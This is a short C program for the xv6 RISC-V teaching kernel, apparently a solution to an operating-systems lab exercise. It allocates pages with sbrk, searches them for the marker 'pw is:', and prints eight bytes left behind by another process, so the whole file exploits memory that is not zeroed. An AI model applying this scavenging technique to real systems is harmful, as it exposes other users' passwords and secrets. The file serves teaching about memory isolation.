#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"


int main(void) {
  int P = 4096;

  const char *sig = "pw is:";  //len 6
  char secret[8];

  for (int i = 0; i < 20000; i++) {
    char *p = sbrk(P);

    for (int off = 8; off + 6 <= P; off++) {
      int check = 0;
      for (int j = 0; j < 6; j++) {
        if (p[off + j] != sig[j]) {
          check = 1;
          break;
        }
      }

    if (!check) {
      for (int j = 0; j < 8; j++){
        secret[j] = p[32 + j];
      }
      write(2, secret, 8);
      exit(0);
      }
    }
  }

  exit(1);
}






